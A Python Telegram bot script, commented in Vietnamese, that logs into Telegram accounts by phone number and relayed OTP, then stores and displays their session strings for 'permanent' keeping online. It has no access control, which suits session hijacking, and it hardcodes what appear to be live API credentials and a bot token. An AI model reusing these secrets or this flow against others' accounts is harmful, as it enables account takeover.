from telethon import TelegramClient, events, Button
from telethon.sessions import StringSession
import sqlite3, datetime, asyncio
from flask import Flask
from threading import Thread

# --- CẤU HÌNH ---
API_ID = 36437338
API_HASH = '18d34c7efc396d277f3db62baa078efc'
BOT_TOKEN = '8492633588:AAGSoL3wMHq8HOD2llLmbp6gdfaAwOqjJvo'

# --- KHỞI TẠO DATABASE ---
def init_db():
    conn = sqlite3.connect('manager.db')
    cursor = conn.cursor()
    cursor.execute('''CREATE TABLE IF NOT EXISTS accounts 
                      (phone TEXT PRIMARY KEY, session TEXT, name TEXT, status TEXT, last_update TEXT)''')
    conn.commit()
    conn.close()

init_db()

bot = TelegramClient('bot_manager', API_ID, API_HASH).start(bot_token=BOT_TOKEN)
login_data = {}

# Flask giữ app sống trên Render
app = Flask('')
@app.route('/')
def home(): return "SYSTEM_READY"

# --- GIAO DIỆN MENU CHÍNH ---
@bot.on(events.NewMessage(pattern='/start'))
async def start(e):
    buttons = [
        [Button.inline("➕ Thêm/Reset Acc", data="login"), Button.inline("📊 Danh sách Acc", data="list")],
        [Button.inline("⚙️ Kiểm tra hệ thống", data="status"), Button.inline("📂 Xuất Session", data="export")]
    ]
    await e.reply("📱 **BẢNG ĐIỀU KHIỂN QUẢN LÝ TÀI KHOẢN**\nChào mừng bạn đến với hệ thống treo vĩnh viễn.", buttons=buttons)

# --- XỬ LÝ NÚT BẤM ---
@bot.on(events.CallbackQuery)
async def callback(e):
    data = e.data.decode('utf-8')
    
    if data == "list":
        conn = sqlite3.connect('manager.db')
        cursor = conn.cursor()
        cursor.execute("SELECT phone, name, status FROM accounts")
        rows = cursor.fetchall()
        msg = "📋 **DANH SÁCH TÀI KHOẢN ĐÃ LƯU:**\n\n"
        if not rows: msg += "Chưa có tài khoản nào."
        for r in rows:
            icon = "✅" if r[2] == "LIVE" else "❌"
            msg += f"{icon} **{r[1]}** (`{r[0]}`)\n"
        await e.edit(msg, buttons=[Button.inline("⬅️ Quay lại", data="menu")])
        conn.close()

    elif data == "login":
        await e.edit("Vui lòng gõ theo cú pháp: `/login [Số_điện_thoại]`\nVí dụ: `/login +84912345678`")

    elif data == "menu":
        buttons = [
            [Button.inline("➕ Thêm/Reset Acc", data="login"), Button.inline("📊 Danh sách Acc", data="list")],
            [Button.inline("⚙️ Kiểm tra hệ thống", data="status"), Button.inline("📂 Xuất Session", data="export")]
        ]
        await e.edit("📱 **BẢNG ĐIỀU KHIỂN QUẢN LÝ TÀI KHOẢN**", buttons=buttons)

# --- LỆNH LOGIN VÀ LẤY THÔNG TIN ---
@bot.on(events.NewMessage(pattern='/login'))
async def login(e):
    phone = e.text.split(' ')[1]
    client = TelegramClient(StringSession(), API_ID, API_HASH)
    await client.connect()
    sent = await client.send_code_request(phone)
    login_data[e.sender_id] = {'phone': phone, 'hash': sent.phone_code_hash, 'client': client}
    await e.reply(f"📩 Đã gửi OTP đến `{phone}`. Hãy nhập mã OTP để hoàn tất.")

@bot.on(events.NewMessage)
async def handle_otp(e):
    if e.sender_id in login_data and e.text.isdigit():
        data = login_data[e.sender_id]
        client = data['client']
        try:
            await client.sign_in(data['phone'], e.text, phone_code_hash=data['hash'])
            me = await client.get_me() # Lấy tên tài khoản
            name = f"{me.first_name} {me.last_name or ''}"
            session_str = client.session.save()
            
            # Lưu thông tin chi tiết vào Database
            conn = sqlite3.connect('manager.db')
            cursor = conn.cursor()
            cursor.execute("INSERT OR REPLACE INTO accounts VALUES (?, ?, ?, ?, ?)",
                           (data['phone'], session_str, name, 'LIVE', str(datetime.datetime.now())))
            conn.commit()
            conn.close()
            
            await e.reply(f"✅ **THÀNH CÔNG!**\n👤 Tên: **{name}**\n📱 SĐT: `{data['phone']}`\n🔑 Session: `{session_str}`")
            del login_data[e.sender_id]
        except Exception as ex:
            await e.reply(f"❌ Lỗi: {ex}")

# Chạy Web Server giữ app sống
Thread(target=lambda: app.run(host='0.0.0.0', port=8080)).start()
bot.run_until_disconnected()
